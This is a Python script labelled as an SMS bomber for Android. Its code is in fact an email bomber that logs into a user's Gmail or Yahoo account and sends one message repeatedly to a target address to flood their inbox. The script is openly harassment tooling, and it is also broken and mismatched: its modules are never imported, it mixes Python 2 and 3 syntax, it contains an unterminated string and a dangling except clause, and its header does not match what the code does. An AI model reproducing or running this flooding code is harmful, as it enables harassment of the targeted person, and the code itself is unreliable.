#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Name: Torpeda - superfast SMS bomber for Android.
# Author: nordbearbot
# Date: 21/01/22
# Version: 0.0.1.
#
# ████████  ██████  ██████  ██████  ███████ ██████   █████  
#    ██    ██    ██ ██   ██ ██   ██ ██      ██   ██ ██   ██ 
#    ██    ██    ██ ██████  ██████  █████   ██   ██ ███████ 
#    ██    ██    ██ ██   ██ ██      ██      ██   ██ ██   ██ 
#    ██     ██████  ██   ██ ██      ███████ ██████  ██   ██ 
                                                          
                                                                                                          
from os import name, system
from os.path import exists, isfile
from random import choice, randint
from threading import Thread
from time import sleep
from colorama import Fore, Style
from requests import get, post
from user_agent import generate_user_agent
from termcolor import colored


def banner():
    system("cls" if name == "nt" else "clear")
    print(colored( '''
▄▄▄█████▓ ▒█████   ██▀███   ██▓███  ▓█████ ▓█████▄  ▄▄▄      
▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██░  ██▒▓█   ▀ ▒██▀ ██▌▒████▄    
▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██░ ██▓▒▒███   ░██   █▌▒██  ▀█▄  
░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██▄█▓▒ ▒▒▓█  ▄ ░▓█▄   ▌░██▄▄▄▄██ 
  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒ ░  ░░▒████▒░▒████▓  ▓█   ▓██▒
  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒▓▒░ ░  ░░░ ▒░ ░ ▒▒▓  ▒  ▒▒   ▓▒█░
    ░      ░ ▒ ▒░   ░▒ ░ ▒░░▒ ░      ░ ░  ░ ░ ▒  ▒   ▒   ▒▒ ░
  ░      ░ ░ ░ ▒    ░░   ░ ░░          ░    ░ ░  ░   ░   ▒   
             ░ ░     ░                 ░  ░   ░          ░  ░
                                            ░                
		  Cделано в @HackSploitt
          Авторы: Enigma & nordbearbot
''','magenta'))


    os.system("clear")

    server = raw_input ('Mail-Server Gmail/Yahoo: ')

    if server == 'gmail' or server == 'Gmail':

        smtp_server = 'smtp.gmail.com'
        port = 587
        set_server = "gmail"

    elif server == 'yahoo' or server == 'Yahoo':

        smtp_server = 'smtp.mail.yahoo.com'
        port = 25
        set_server = "yahoo"

    else:

        print(R + "ОШИЬКА - Данный скрипт работает только для gmail или yahoo." + W)
        sys.exit()

    email_user = raw_input('Почта: ')
    passwd     = getpass.getpass('Пароль: ')
    email_to   = raw_input('\nTo: ')
    subject    = raw_input('Цель: ')
    body       = raw_input('Сообщение: ')
    total      = input('Кол-во сообщений: ')

    try:

        server = smtplib.SMTP(smtp_server,port) 
        server.ehlo()

        if set_server == "gmail":
            server.starttls()

        server.login(email_user,passwd)

        print("\n\n\n - Цель : {} -\n".format(email_to))

        for i in range(1, total+1):

            msg = 'От: ' + email_user + '\nЦели: ' + subject + '\n' + body

            server.sendmail(email_user,email_to,msg)

            print(G + "\rОтправлено писем - {}".format(i))

            sys.stdout.flush()

        server.quit()

        print( R + "\n\n-Процесс прекращен-" + W)


    except KeyboardInterrupt:

        print(R + "\nОшибка - Набор прерван + W)
        sys.exit()

    except smtplib.SMTPAuthenticationError:

        print( R + "\nОшибка - Ошибка авторизации. Проверьте правильность введенных данных от аккаунта?" + W)
        sys.exit()

except smtplib.SMTPAuthenticationError:

    sys.exit()
